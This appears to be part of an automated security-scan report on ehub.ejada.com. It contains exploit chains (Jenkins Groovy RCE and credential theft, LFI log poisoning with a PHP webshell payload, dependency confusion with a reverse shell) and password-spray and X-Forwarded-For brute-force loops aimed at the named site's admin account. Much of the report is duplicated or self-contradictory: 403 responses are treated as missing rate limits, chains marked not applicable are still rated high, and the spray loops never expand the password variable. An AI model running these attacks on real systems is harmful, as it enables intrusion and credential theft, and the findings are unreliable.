1. Access Jenkins /script endpoint (unauthenticated or weak creds)
2. Execute Groovy: println 'id'.execute().text
3. Read /var/jenkins_home/credentials.xml for stored secrets
4. Extract SSH keys, API tokens, cloud credentials from Jenkins vaults
5. Use credentials to pivot to connected systems (GitHub, AWS, GCP)
6. Establish reverse shell / C2 beacon for persistence

Impact: Full server RCE, credential harvest, lateral movement to all connected systems

**Evidence:**
```
Applicable to target: False | CVSS: 10.0
```

**PoC:**
```bash
# See attack steps above — each step must be verified manually
```

**Fix:** Address all prerequisite vulnerabilities. Implement defence-in-depth: WAF, egress filtering, least privilege, network segmentation, SIEM alerting.

---

#### [HIGH] CHAIN-LFI-RCE: [EXPLOIT CHAIN] LFI → Log Poison → RCE
**CWE:** CWE-693 | **CVSS:** 9.8 | **Category:** Exploit Chain

[THEORETICAL — VERIFY PREREQUISITES] Complete exploit narrative: LFI → Log Poison → RCE

Attack steps:
1. Confirm LFI via ?page=../../../../etc/passwd
2. Include PHP interpreter via ?page=php://filter/convert.base64-encode/resource=index
3. Poison Apache/Nginx access log: curl -A '<?php system($_GET[cmd]); ?>' target
4. Include log file via LFI: ?page=../../../../var/log/apache2/access.log
5. Execute commands: ?page=...access.log&cmd=id
6. Upgrade to reverse shell, establish persistence

Impact: OS-level RCE, full server compromise, data exfiltration

**Evidence:**
```
Applicable to target: False | CVSS: 9.8
```

**PoC:**
```bash
# See attack steps above — each step must be verified manually
```

**Fix:** Address all prerequisite vulnerabilities. Implement defence-in-depth: WAF, egress filtering, least privilege, network segmentation, SIEM alerting.

---

#### [HIGH] CHAIN-AUTH-BYPASS-ADMIN: [EXPLOIT CHAIN] Auth Bypass → Admin Takeover → Data Exfil
**CWE:** CWE-693 | **CVSS:** 9.6 | **Category:** Exploit Chain

[THEORETICAL — VERIFY PREREQUISITES] Complete exploit narrative: Auth Bypass → Admin Takeover → Data Exfil

Attack steps:
1. Identify auth bypass via SQLi, JWT none-alg, or IDOR on /api/admin
2. Access admin panel without valid credentials
3. Create new admin account or reset existing admin password
4. Access all user data, PII, financial records via admin API
5. Export database via admin data-export function
6. Modify user records / financial transactions

Impact: Complete admin takeover, PII breach, financial fraud

**Evidence:**
```
Applicable to target: False | CVSS: 9.6
```

**PoC:**
```bash
# See attack steps above — each step must be verified manually
```

**Fix:** Address all prerequisite vulnerabilities. Implement defence-in-depth: WAF, egress filtering, least privilege, network segmentation, SIEM alerting.

---

#### [HIGH] CHAIN-SUPPLY-CHAIN-SAST: [EXPLOIT CHAIN] Supply Chain → Internal Package Confusion → RCE
**CWE:** CWE-693 | **CVSS:** 9.3 | **Category:** Exploit Chain

[THEORETICAL — VERIFY PREREQUISITES] Complete exploit narrative: Supply Chain → Internal Package Confusion → RCE

Attack steps:
1. Extract internal package names from exposed package.json / requirements.txt
2. Register same package names on public npm/PyPI with higher version
3. Wait for CI/CD pipeline to install public version during build
4. Malicious package executes postinstall/setup.py with reverse shell
5. Access CI/CD secrets, source code, and production deployment credentials
6. Pivot to production environment

Impact: Supply chain compromise, CI/CD takeover, production deployment control

**Evidence:**
```
Applicable to target: False | CVSS: 9.3
```

**PoC:**
```bash
# See attack steps above — each step must be verified manually
```

**Fix:** Address all prerequisite vulnerabilities. Implement defence-in-depth: WAF, egress filtering, least privilege, network segmentation, SIEM alerting.

---

#### [HIGH] CREDSTUFF-LOGIN: Credential Stuffing Surface — No Rate Limit at /login
**CWE:** CWE-307 | **CVSS:** 7.5 | **Category:** Auth / Credential Stuffing

Auth endpoint /login has no apparent rate limiting or lockout. Credential stuffing surface: 10 common passwords × all leaked credential pairs can be tested rapidly.

**Evidence:**
```
HTTP 403 | Rate-limited: False | Lockout: False
```

**PoC:**
```bash
# Password spray (authorized testing only):
for pass in Password1! Welcome1! Summer2024!; do
  curl -sk -X POST 'https://ehub.ejada.com/login'   -H 'Content-Type: application/json'   -d '{"email":"admin@ejada.com","password":"$pass"}' |   grep -v 'invalid\|error'; done
```

**Fix:** Implement rate limiting (5 attempts / 15 min per IP and per account). Add CAPTCHA after 3 failures. Enable account lockout. Implement breached credential detection (HaveIBeenPwned API). Use CAPTCHA on all auth flows.

---

#### [HIGH] CREDSTUFF-API_AUTH: Credential Stuffing Surface — No Rate Limit at /api/auth
**CWE:** CWE-307 | **CVSS:** 7.5 | **Category:** Auth / Credential Stuffing

Auth endpoint /api/auth has no apparent rate limiting or lockout. Credential stuffing surface: 10 common passwords × all leaked credential pairs can be tested rapidly.

**Evidence:**
```
HTTP 403 | Rate-limited: False | Lockout: False
```

**PoC:**
```bash
# Password spray (authorized testing only):
for pass in Password1! Welcome1! Summer2024!; do
  curl -sk -X POST 'https://ehub.ejada.com/api/auth'   -H 'Content-Type: application/json'   -d '{"email":"admin@ejada.com","password":"$pass"}' |   grep -v 'invalid\|error'; done
```

**Fix:** Implement rate limiting (5 attempts / 15 min per IP and per account). Add CAPTCHA after 3 failures. Enable account lockout. Implement breached credential detection (HaveIBeenPwned API). Use CAPTCHA on all auth flows.

---

#### [HIGH] CREDSTUFF-API_V1_LOGIN: Credential Stuffing Surface — No Rate Limit at /api/v1/login
**CWE:** CWE-307 | **CVSS:** 7.5 | **Category:** Auth / Credential Stuffing

Auth endpoint /api/v1/login has no apparent rate limiting or lockout. Credential stuffing surface: 10 common passwords × all leaked credential pairs can be tested rapidly.

**Evidence:**
```
HTTP 403 | Rate-limited: False | Lockout: False
```

**PoC:**
```bash
# Password spray (authorized testing only):
for pass in Password1! Welcome1! Summer2024!; do
  curl -sk -X POST 'https://ehub.ejada.com/api/v1/login'   -H 'Content-Type: application/json'   -d '{"email":"admin@ejada.com","password":"$pass"}' |   grep -v 'invalid\|error'; done
```

**Fix:** Implement rate limiting (5 attempts / 15 min per IP and per account). Add CAPTCHA after 3 failures. Enable account lockout. Implement breached credential detection (HaveIBeenPwned API). Use CAPTCHA on all auth flows.

---

#### [HIGH] CREDSTUFF-API_V2_AUTH: Credential Stuffing Surface — No Rate Limit at /api/v2/auth
**CWE:** CWE-307 | **CVSS:** 7.5 | **Category:** Auth / Credential Stuffing

Auth endpoint /api/v2/auth has no apparent rate limiting or lockout. Credential stuffing surface: 10 common passwords × all leaked credential pairs can be tested rapidly.

**Evidence:**
```
HTTP 403 | Rate-limited: False | Lockout: False
```

**PoC:**
```bash
# Password spray (authorized testing only):
for pass in Password1! Welcome1! Summer2024!; do
  curl -sk -X POST 'https://ehub.ejada.com/api/v2/auth'   -H 'Content-Type: application/json'   -d '{"email":"admin@ejada.com","password":"$pass"}' |   grep -v 'invalid\|error'; done
```

**Fix:** Implement rate limiting (5 attempts / 15 min per IP and per account). Add CAPTCHA after 3 failures. Enable account lockout. Implement breached credential detection (HaveIBeenPwned API). Use CAPTCHA on all auth flows.

---

#### [HIGH] CREDSTUFF-API_SIGNIN: Credential Stuffing Surface — No Rate Limit at /api/signin
**CWE:** CWE-307 | **CVSS:** 7.5 | **Category:** Auth / Credential Stuffing

Auth endpoint /api/signin has no apparent rate limiting or lockout. Credential stuffing surface: 10 common passwords × all leaked credential pairs can be tested rapidly.

**Evidence:**
```
HTTP 403 | Rate-limited: False | Lockout: False
```

**PoC:**
```bash
# Password spray (authorized testing only):
for pass in Password1! Welcome1! Summer2024!; do
  curl -sk -X POST 'https://ehub.ejada.com/api/signin'   -H 'Content-Type: application/json'   -d '{"email":"admin@ejada.com","password":"$pass"}' |   grep -v 'invalid\|error'; done
```

**Fix:** Implement rate limiting (5 attempts / 15 min per IP and per account). Add CAPTCHA after 3 failures. Enable account lockout. Implement breached credential detection (HaveIBeenPwned API). Use CAPTCHA on all auth flows.

---

#### [HIGH] CREDSTUFF-AUTH_TOKEN: Credential Stuffing Surface — No Rate Limit at /auth/token
**CWE:** CWE-307 | **CVSS:** 7.5 | **Category:** Auth / Credential Stuffing

Auth endpoint /auth/token has no apparent rate limiting or lockout. Credential stuffing surface: 10 common passwords × all leaked credential pairs can be tested rapidly.

**Evidence:**
```
HTTP 403 | Rate-limited: False | Lockout: False
```

**PoC:**
```bash
# Password spray (authorized testing only):
for pass in Password1! Welcome1! Summer2024!; do
  curl -sk -X POST 'https://ehub.ejada.com/auth/token'   -H 'Content-Type: application/json'   -d '{"email":"admin@ejada.com","password":"$pass"}' |   grep -v 'invalid\|error'; done
```

**Fix:** Implement rate limiting (5 attempts / 15 min per IP and per account). Add CAPTCHA after 3 failures. Enable account lockout. Implement breached credential detection (HaveIBeenPwned API). Use CAPTCHA on all auth flows.

---

#### [HIGH] CREDSTUFF-API_SESSIONS: Credential Stuffing Surface — No Rate Limit at /api/sessions
**CWE:** CWE-307 | **CVSS:** 7.5 | **Category:** Auth / Credential Stuffing

Auth endpoint /api/sessions has no apparent rate limiting or lockout. Credential stuffing surface: 10 common passwords × all leaked credential pairs can be tested rapidly.

**Evidence:**
```
HTTP 403 | Rate-limited: False | Lockout: False
```

**PoC:**
```bash
# Password spray (authorized testing only):
for pass in Password1! Welcome1! Summer2024!; do
  curl -sk -X POST 'https://ehub.ejada.com/api/sessions'   -H 'Content-Type: application/json'   -d '{"email":"admin@ejada.com","password":"$pass"}' |   grep -v 'invalid\|error'; done
```

**Fix:** Implement rate limiting (5 attempts / 15 min per IP and per account). Add CAPTCHA after 3 failures. Enable account lockout. Implement breached credential detection (HaveIBeenPwned API). Use CAPTCHA on all auth flows.

---

#### [HIGH] CREDSTUFF-API_LOGIN: Credential Stuffing Surface — No Rate Limit at /api/login
**CWE:** CWE-307 | **CVSS:** 7.5 | **Category:** Auth / Credential Stuffing

Auth endpoint /api/login has no apparent rate limiting or lockout. Credential stuffing surface: 10 common passwords × all leaked credential pairs can be tested rapidly.

**Evidence:**
```
HTTP 403 | Rate-limited: False | Lockout: False
```

**PoC:**
```bash
# Password spray (authorized testing only):
for pass in Password1! Welcome1! Summer2024!; do
  curl -sk -X POST 'https://ehub.ejada.com/api/login'   -H 'Content-Type: application/json'   -d '{"email":"admin@ejada.com","password":"$pass"}' |   grep -v 'invalid\|error'; done
```

**Fix:** Implement rate limiting (5 attempts / 15 min per IP and per account). Add CAPTCHA after 3 failures. Enable account lockout. Implement breached credential detection (HaveIBeenPwned API). Use CAPTCHA on all auth flows.

---

#### [HIGH] CREDSTUFF-API_AUTH: Credential Stuffing Surface — No Rate Limit at /api/auth
**CWE:** CWE-307 | **CVSS:** 7.5 | **Category:** Auth / Credential Stuffing

Auth endpoint /api/auth has no apparent rate limiting or lockout. Credential stuffing surface: 10 common passwords × all leaked credential pairs can be tested rapidly.

**Evidence:**
```
HTTP 403 | Rate-limited: False | Lockout: False
```

**PoC:**
```bash
# Password spray (authorized testing only):
for pass in Password1! Welcome1! Summer2024!; do
  curl -sk -X POST 'https://ehub.ejada.com/api/auth'   -H 'Content-Type: application/json'   -d '{"email":"admin@ejada.com","password":"$pass"}' |   grep -v 'invalid\|error'; done
```

**Fix:** Implement rate limiting (5 attempts / 15 min per IP and per account). Add CAPTCHA after 3 failures. Enable account lockout. Implement breached credential detection (HaveIBeenPwned API). Use CAPTCHA on all auth flows.

---

#### [HIGH] CREDSTUFF-API_V1_LOGIN: Credential Stuffing Surface — No Rate Limit at /api/v1/login
**CWE:** CWE-307 | **CVSS:** 7.5 | **Category:** Auth / Credential Stuffing

Auth endpoint /api/v1/login has no apparent rate limiting or lockout. Credential stuffing surface: 10 common passwords × all leaked credential pairs can be tested rapidly.

**Evidence:**
```
HTTP 403 | Rate-limited: False | Lockout: False
```

**PoC:**
```bash
# Password spray (authorized testing only):
for pass in Password1! Welcome1! Summer2024!; do
  curl -sk -X POST 'https://ehub.ejada.com/api/v1/login'   -H 'Content-Type: application/json'   -d '{"email":"admin@ejada.com","password":"$pass"}' |   grep -v 'invalid\|error'; done
```

**Fix:** Implement rate limiting (5 attempts / 15 min per IP and per account). Add CAPTCHA after 3 failures. Enable account lockout. Implement breached credential detection (HaveIBeenPwned API). Use CAPTCHA on all auth flows.

---

#### [HIGH] CREDSTUFF-API_V2_AUTH: Credential Stuffing Surface — No Rate Limit at /api/v2/auth
**CWE:** CWE-307 | **CVSS:** 7.5 | **Category:** Auth / Credential Stuffing

Auth endpoint /api/v2/auth has no apparent rate limiting or lockout. Credential stuffing surface: 10 common passwords × all leaked credential pairs can be tested rapidly.

**Evidence:**
```
HTTP 403 | Rate-limited: False | Lockout: False
```

**PoC:**
```bash
# Password spray (authorized testing only):
for pass in Password1! Welcome1! Summer2024!; do
  curl -sk -X POST 'https://ehub.ejada.com/api/v2/auth'   -H 'Content-Type: application/json'   -d '{"email":"admin@ejada.com","password":"$pass"}' |   grep -v 'invalid\|error'; done
```

**Fix:** Implement rate limiting (5 attempts / 15 min per IP and per account). Add CAPTCHA after 3 failures. Enable account lockout. Implement breached credential detection (HaveIBeenPwned API). Use CAPTCHA on all auth flows.

---

#### [HIGH] CREDSTUFF-API_SIGNIN: Credential Stuffing Surface — No Rate Limit at /api/signin
**CWE:** CWE-307 | **CVSS:** 7.5 | **Category:** Auth / Credential Stuffing

Auth endpoint /api/signin has no apparent rate limiting or lockout. Credential stuffing surface: 10 common passwords × all leaked credential pairs can be tested rapidly.

**Evidence:**
```
HTTP 403 | Rate-limited: False | Lockout: False
```

**PoC:**
```bash
# Password spray (authorized testing only):
for pass in Password1! Welcome1! Summer2024!; do
  curl -sk -X POST 'https://ehub.ejada.com/api/signin'   -H 'Content-Type: application/json'   -d '{"email":"admin@ejada.com","password":"$pass"}' |   grep -v 'invalid\|error'; done
```

**Fix:** Implement rate limiting (5 attempts / 15 min per IP and per account). Add CAPTCHA after 3 failures. Enable account lockout. Implement breached credential detection (HaveIBeenPwned API). Use CAPTCHA on all auth flows.

---

#### [HIGH] CREDSTUFF-AUTH_TOKEN: Credential Stuffing Surface — No Rate Limit at /auth/token
**CWE:** CWE-307 | **CVSS:** 7.5 | **Category:** Auth / Credential Stuffing

Auth endpoint /auth/token has no apparent rate limiting or lockout. Credential stuffing surface: 10 common passwords × all leaked credential pairs can be tested rapidly.

**Evidence:**
```
HTTP 403 | Rate-limited: False | Lockout: False
```

**PoC:**
```bash
# Password spray (authorized testing only):
for pass in Password1! Welcome1! Summer2024!; do
  curl -sk -X POST 'https://ehub.ejada.com/auth/token'   -H 'Content-Type: application/json'   -d '{"email":"admin@ejada.com","password":"$pass"}' |   grep -v 'invalid\|error'; done
```

**Fix:** Implement rate limiting (5 attempts / 15 min per IP and per account). Add CAPTCHA after 3 failures. Enable account lockout. Implement breached credential detection (HaveIBeenPwned API). Use CAPTCHA on all auth flows.

---

#### [HIGH] CREDSTUFF-API_SESSIONS: Credential Stuffing Surface — No Rate Limit at /api/sessions
**CWE:** CWE-307 | **CVSS:** 7.5 | **Category:** Auth / Credential Stuffing

Auth endpoint /api/sessions has no apparent rate limiting or lockout. Credential stuffing surface: 10 common passwords × all leaked credential pairs can be tested rapidly.

**Evidence:**
```
HTTP 403 | Rate-limited: False | Lockout: False
```

**PoC:**
```bash
# Password spray (authorized testing only):
for pass in Password1! Welcome1! Summer2024!; do
  curl -sk -X POST 'https://ehub.ejada.com/api/sessions'   -H 'Content-Type: application/json'   -d '{"email":"admin@ejada.com","password":"$pass"}' |   grep -v 'invalid\|error'; done
```

**Fix:** Implement rate limiting (5 attempts / 15 min per IP and per account). Add CAPTCHA after 3 failures. Enable account lockout. Implement breached credential detection (HaveIBeenPwned API). Use CAPTCHA on all auth flows.

---

#### [HIGH] CREDSTUFF-LOGIN: Credential Stuffing Surface — No Rate Limit at /login
**CWE:** CWE-307 | **CVSS:** 7.5 | **Category:** Auth / Credential Stuffing

Auth endpoint /login has no apparent rate limiting or lockout. Credential stuffing surface: 10 common passwords × all leaked credential pairs can be tested rapidly.

**Evidence:**
```
HTTP 403 | Rate-limited: False | Lockout: False
```

**PoC:**
```bash
# Password spray (authorized testing only):
for pass in Password1! Welcome1! Summer2024!; do
  curl -sk -X POST 'https://ehub.ejada.com/login'   -H 'Content-Type: application/json'   -d '{"email":"admin@ejada.com","password":"$pass"}' |   grep -v 'invalid\|error'; done
```

**Fix:** Implement rate limiting (5 attempts / 15 min per IP and per account). Add CAPTCHA after 3 failures. Enable account lockout. Implement breached credential detection (HaveIBeenPwned API). Use CAPTCHA on all auth flows.

---

#### [HIGH] CREDSTUFF-API_LOGIN: Credential Stuffing Surface — No Rate Limit at /api/login
**CWE:** CWE-307 | **CVSS:** 7.5 | **Category:** Auth / Credential Stuffing

Auth endpoint /api/login has no apparent rate limiting or lockout. Credential stuffing surface: 10 common passwords × all leaked credential pairs can be tested rapidly.

**Evidence:**
```
HTTP 403 | Rate-limited: False | Lockout: False
```

**PoC:**
```bash
# Password spray (authorized testing only):
for pass in Password1! Welcome1! Summer2024!; do
  curl -sk -X POST 'https://ehub.ejada.com/api/login'   -H 'Content-Type: application/json'   -d '{"email":"admin@ejada.com","password":"$pass"}' |   grep -v 'invalid\|error'; done
```

**Fix:** Implement rate limiting (5 attempts / 15 min per IP and per account). Add CAPTCHA after 3 failures. Enable account lockout. Implement breached credential detection (HaveIBeenPwned API). Use CAPTCHA on all auth flows.

---

#### [HIGH] CREDSTUFF-API_AUTH: Credential Stuffing Surface — No Rate Limit at /api/auth
**CWE:** CWE-307 | **CVSS:** 7.5 | **Category:** Auth / Credential Stuffing

Auth endpoint /api/auth has no apparent rate limiting or lockout. Credential stuffing surface: 10 common passwords × all leaked credential pairs can be tested rapidly.

**Evidence:**
```
HTTP 403 | Rate-limited: False | Lockout: False
```

**PoC:**
```bash
# Password spray (authorized testing only):
for pass in Password1! Welcome1! Summer2024!; do
  curl -sk -X POST 'https://ehub.ejada.com/api/auth'   -H 'Content-Type: application/json'   -d '{"email":"admin@ejada.com","password":"$pass"}' |   grep -v 'invalid\|error'; done
```

**Fix:** Implement rate limiting (5 attempts / 15 min per IP and per account). Add CAPTCHA after 3 failures. Enable account lockout. Implement breached credential detection (HaveIBeenPwned API). Use CAPTCHA on all auth flows.

---

#### [HIGH] CREDSTUFF-API_V1_LOGIN: Credential Stuffing Surface — No Rate Limit at /api/v1/login
**CWE:** CWE-307 | **CVSS:** 7.5 | **Category:** Auth / Credential Stuffing

Auth endpoint /api/v1/login has no apparent rate limiting or lockout. Credential stuffing surface: 10 common passwords × all leaked credential pairs can be tested rapidly.

**Evidence:**
```
HTTP 403 | Rate-limited: False | Lockout: False
```

**PoC:**
```bash
# Password spray (authorized testing only):
for pass in Password1! Welcome1! Summer2024!; do
  curl -sk -X POST 'https://ehub.ejada.com/api/v1/login'   -H 'Content-Type: application/json'   -d '{"email":"admin@ejada.com","password":"$pass"}' |   grep -v 'invalid\|error'; done
```

**Fix:** Implement rate limiting (5 attempts / 15 min per IP and per account). Add CAPTCHA after 3 failures. Enable account lockout. Implement breached credential detection (HaveIBeenPwned API). Use CAPTCHA on all auth flows.

---

#### [HIGH] CREDSTUFF-API_V2_AUTH: Credential Stuffing Surface — No Rate Limit at /api/v2/auth
**CWE:** CWE-307 | **CVSS:** 7.5 | **Category:** Auth / Credential Stuffing

Auth endpoint /api/v2/auth has no apparent rate limiting or lockout. Credential stuffing surface: 10 common passwords × all leaked credential pairs can be tested rapidly.

**Evidence:**
```
HTTP 403 | Rate-limited: False | Lockout: False
```

**PoC:**
```bash
# Password spray (authorized testing only):
for pass in Password1! Welcome1! Summer2024!; do
  curl -sk -X POST 'https://ehub.ejada.com/api/v2/auth'   -H 'Content-Type: application/json'   -d '{"email":"admin@ejada.com","password":"$pass"}' |   grep -v 'invalid\|error'; done
```

**Fix:** Implement rate limiting (5 attempts / 15 min per IP and per account). Add CAPTCHA after 3 failures. Enable account lockout. Implement breached credential detection (HaveIBeenPwned API). Use CAPTCHA on all auth flows.

---

#### [HIGH] CREDSTUFF-API_SIGNIN: Credential Stuffing Surface — No Rate Limit at /api/signin
**CWE:** CWE-307 | **CVSS:** 7.5 | **Category:** Auth / Credential Stuffing

Auth endpoint /api/signin has no apparent rate limiting or lockout. Credential stuffing surface: 10 common passwords × all leaked credential pairs can be tested rapidly.

**Evidence:**
```
HTTP 403 | Rate-limited: False | Lockout: False
```

**PoC:**
```bash
# Password spray (authorized testing only):
for pass in Password1! Welcome1! Summer2024!; do
  curl -sk -X POST 'https://ehub.ejada.com/api/signin'   -H 'Content-Type: application/json'   -d '{"email":"admin@ejada.com","password":"$pass"}' |   grep -v 'invalid\|error'; done
```

**Fix:** Implement rate limiting (5 attempts / 15 min per IP and per account). Add CAPTCHA after 3 failures. Enable account lockout. Implement breached credential detection (HaveIBeenPwned API). Use CAPTCHA on all auth flows.

---

#### [HIGH] CREDSTUFF-AUTH_TOKEN: Credential Stuffing Surface — No Rate Limit at /auth/token
**CWE:** CWE-307 | **CVSS:** 7.5 | **Category:** Auth / Credential Stuffing

Auth endpoint /auth/token has no apparent rate limiting or lockout. Credential stuffing surface: 10 common passwords × all leaked credential pairs can be tested rapidly.

**Evidence:**
```
HTTP 403 | Rate-limited: False | Lockout: False
```

**PoC:**
```bash
# Password spray (authorized testing only):
for pass in Password1! Welcome1! Summer2024!; do
  curl -sk -X POST 'https://ehub.ejada.com/auth/token'   -H 'Content-Type: application/json'   -d '{"email":"admin@ejada.com","password":"$pass"}' |   grep -v 'invalid\|error'; done
```

**Fix:** Implement rate limiting (5 attempts / 15 min per IP and per account). Add CAPTCHA after 3 failures. Enable account lockout. Implement breached credential detection (HaveIBeenPwned API). Use CAPTCHA on all auth flows.

---

#### [HIGH] CREDSTUFF-API_SESSIONS: Credential Stuffing Surface — No Rate Limit at /api/sessions
**CWE:** CWE-307 | **CVSS:** 7.5 | **Category:** Auth / Credential Stuffing

Auth endpoint /api/sessions has no apparent rate limiting or lockout. Credential stuffing surface: 10 common passwords × all leaked credential pairs can be tested rapidly.

**Evidence:**
```
HTTP 403 | Rate-limited: False | Lockout: False
```

**PoC:**
```bash
# Password spray (authorized testing only):
for pass in Password1! Welcome1! Summer2024!; do
  curl -sk -X POST 'https://ehub.ejada.com/api/sessions'   -H 'Content-Type: application/json'   -d '{"email":"admin@ejada.com","password":"$pass"}' |   grep -v 'invalid\|error'; done
```

**Fix:** Implement rate limiting (5 attempts / 15 min per IP and per account). Add CAPTCHA after 3 failures. Enable account lockout. Implement breached credential detection (HaveIBeenPwned API). Use CAPTCHA on all auth flows.

---

#### [HIGH] RATELIMIT-BYPASS-IPHDR-API_LOGIN: Rate Limit Bypass via IP Header Rotation at /api/login
**CWE:** CWE-307 | **CVSS:** 7.5 | **Category:** Rate Limiting

Sent 9 requests with rotating IP spoof headers to /api/login. No HTTP 429 received (codes: {403}). Rate limiting appears to be based on IP address from spoofable headers — enables unlimited brute-force attacks.

**Evidence:**
```
Response codes: [403, 403, 403, 403, 403, 403, 403, 403, 403]
```

**PoC:**
```bash
for i in $(seq 1 50); do
  curl -sk -X POST 'https://ehub.ejada.com/api/login' -H 'X-Forwarded-For: 1.2.3.$i' -d '{"username":"admin","password":"password$i"}' &
done
```

**Fix:** Rate-limit by session/account, not IP. Validate X-Forwarded-For against trusted proxy list. Implement CAPTCHA after N failures. Use account lockout with exponential backoff.

---

#### [HIGH] RATELIMIT-BYPASS-IPHDR-API_AUTH: Rate Limit Bypass via IP Header Rotation at /api/auth
**CWE:** CWE-307 | **CVSS:** 7.5 | **Category:** Rate Limiting

Sent 9 requests with rotating IP spoof headers to /api/auth. No HTTP 429 received (codes: {403}). Rate limiting appears to be based on IP address from spoofable headers — enables unlimited brute-force attacks.

**Evidence:**
```
Response codes: [403, 403, 403, 403, 403, 403, 403, 403, 403]
```

**PoC:**
```bash
for i in $(seq 1 50); do
  curl -sk -X POST 'https://ehub.ejada.com/api/auth' -H 'X-Forwarded-For: 1.2.3.$i' -d '{"username":"admin","password":"password$i"}' &
done
```

**Fix:** Rate-limit by session/account, not IP. Validate X-Forwarded-For against trusted proxy list. Implement CAPTCHA after N failures. Use account lockout with exponential backoff.

---

#### [HIGH] RATELIMIT-BYPASS-IPHDR-LOGIN: Rate Limit Bypass via IP Header Rotation at /login
**CWE:** CWE-307 | **CVSS:** 7.5 | **Category:** Rate Limiting

Sent 9 requests with rotating IP spoof headers to /login. No HTTP 429 received (codes: {403}). Rate limiting appears to be based on IP address from spoofable headers — enables unlimited brute-force attacks.

**Evidence:**
```
Response codes: [403, 403, 403, 403, 403, 403, 403, 403, 403]
```

**PoC:**
```bash
for i in $(seq 1 50); do
  curl -sk -X POST 'https://ehub.ejada.com/login' -H 'X-Forwarded-For: 1.2.3.$i' -d '{"username":"admin","password":"password$i"}' &
done
```

**Fix:** Rate-limit by session/account, not IP. Validate X-Forwarded-For against trusted proxy list. Implement CAPTCHA after N failures. Use account lockout with exponential backoff.

---

#### [HIGH] RATELIMIT-BYPASS-IPHDR-AUTH: Rate Limit Bypass via IP Header Rotation at /auth
**CWE:** CWE-307 | **CVSS:** 7.5 | **Category:** Rate Limiting

Sent 9 requests with rotating IP spoof headers to /auth. No HTTP 429 received (codes: {403}). Rate limiting appears to be based on IP address from spoofable headers — enables unlimited brute-force attacks.

**Evidence:**
```
Response codes: [403, 403, 403, 403, 403, 403, 403, 403, 403]
```

**PoC:**
```bash
for i in $(seq 1 50); do
  curl -sk -X POST 'https://ehub.ejada.com/auth' -H 'X-Forwarded-For: 1.2.3.$i' -d '{"username":"admin","password":"password$i"}' &
done
```

**Fix:** Rate-limit by session/account, not IP. Validate X-Forwarded-For against trusted proxy list. Implement CAPTCHA after N failures. Use account lockout with exponential backoff.

---

#### [MEDIUM] F-CJ-001: Clickjacking Vulnerability
**CWE:** CWE-1021 | **CVSS:** 5.4 | **Category:** Clickjacking

Page can be embedded in an iframe — clickjacking possible.

**Evidence:**
```
X-Frame-Options: '' | CSP frame-ancestors: False
```

**PoC:**
```bash
curl -sI 'https://ehub.ejada.com/' | grep -i 'x-frame\|frame-ancestors'
```

**Fix:** Set X-Frame-Options: DENY or CSP frame-ancestors 'self'.

---

#### [MEDIUM] DANGLE-DNS-BLOG: Dangling DNS — blog.ejada.com does not resolve
**CWE:** CWE-350 | **CVSS:** 5.4 | **Category:** Subdomain Takeover

Subdomain blog.ejada.com has no DNS record. If a CNAME chain points to an unclaimed service, takeover may be possible.

**Evidence:**
```

```

**PoC:**
```bash
dig blog.ejada.com +short
```

**Fix:** Remove stale DNS records. Audit all CNAME targets for unclaimed services.

---

#### [MEDIUM] DANGLE-DNS-HELP: Dangling DNS — help.ejada.com does not resolve
**CWE:** CWE-350 | **CVSS:** 5.4 | **Category:** Subdomain Takeover

Subdomain help.ejada.com has no DNS record. If a CNAME chain points to an unclaimed service, takeover may be possible.

**Evidence:**
```

```

**PoC:**
```bash
dig help.ejada.com +short
```

**Fix:** Remove stale DNS records. Audit all CNAME targets for unclaimed services.

---

#### [MEDIUM] DANGLE-DNS-SUPPORT: Dangling DNS — support.ejada.com does not resolve
**CWE:** CWE-350 | **CVSS:** 5.4 | **Category:** Subdomain Takeover

Subdomain support.ejada.com has no DNS record. If a CNAME chain points to an unclaimed service, takeover may be possible.

**Evidence:**
```

```

**PoC:**
```bash
dig support.ejada.com +short
```

**Fix:** Remove stale DNS records. Audit all CNAME targets for unclaimed services.

---

#### [MEDIUM] DANGLE-DNS-DEV: Dangling DNS — dev.ejada.com does not resolve
**CWE:** CWE-350 | **CVSS:** 5.4 | **Category:** Subdomain Takeover

Subdomain dev.ejada.com has no DNS record. If a CNAME chain points to an unclaimed service, takeover may be possible.

**Evidence:**
```

```

**PoC:**
```bash
dig dev.ejada.com +short
```

**Fix:** Remove stale DNS records. Audit all CNAME targets for unclaimed services.

---

#### [MEDIUM] DANGLE-DNS-STAGING: Dangling DNS — staging.ejada.com does not resolve
**CWE:** CWE-350 | **CVSS:** 5.4 | **Category:** Subdomain Takeover

Subdomain staging.ejada.com has no DNS record. If a CNAME chain points to an unclaimed service, takeover may be possible.

**Evidence:**
```

```

**PoC:**
```bash
dig staging.ejada.com +short
```

**Fix:** Remove stale DNS records. Audit all CNAME targets for unclaimed services.

---

#### [MEDIUM] DANGLE-DNS-API: Dangling DNS — api.ejada.com does not resolve
**CWE:** CWE-350 | **CVSS:** 5.4 | **Category:** Subdomain Takeover

Subdomain api.ejada.com has no DNS record. If a CNAME chain points to an unclaimed service, takeover may be possible.

**Evidence:**
```

```

**PoC:**
```bash
dig api.ejada.com +short
```

**Fix:** Remove stale DNS records. Audit all CNAME targets for unclaimed services.

---

#### [MEDIUM] DANGLE-DNS-BETA: Dangling DNS — beta.ejada.com does not resolve
**CWE:** CWE-350 | **CVSS:** 5.4 | **Category:** Subdomain Takeover

Subdomain beta.ejada.com has no DNS record. If a CNAME chain points to an unclaimed service, takeover may be possible.

**Evidence:**
```

```

**PoC:**
```bash
dig beta.ejada.com +short
```

**Fix:** Remove stale DNS records. Audit all CNAME targets for unclaimed services.

---

#### [MEDIUM] HTTP2-RAPID-RESET: HTTP/2 enabled — assess CVE-2023-44487 (Rapid Reset) exposure
**CWE:** CWE-400 | **CVSS:** 7.5 | **Category:** DoS

Server supports HTTP/2. Verify it is patched against CVE-2023-44487 (HTTP/2 Rapid Reset DoS). Vulnerable servers can be overwhelmed by RST_STREAM flood.

**Evidence:**
```

```

**PoC:**
```bash
curl -sk --http2 -I https://ehub.ejada.com/
```

**Fix:** Update HTTP server to a patched version. Apply h2 connection rate limits. Consider h2c → h1 downgrade for untrusted clients.

---

#### [MEDIUM] DEBUG-EP-_DEBUG_PPROF: Debug/profiler endpoint accessible: /debug/pprof
**CWE:** CWE-489 | **CVSS:** 4.3 | **Category:** Information Disclosure

https://ehub.ejada.com/debug/pprof returned 403. Content: Host not in allowlist

**Evidence:**
```

```

**PoC:**
```bash
curl -sk https://ehub.ejada.com/debug/pprof
```

**Fix:** Disable debug endpoints in production. Restrict with network ACL or remove entirely.

---

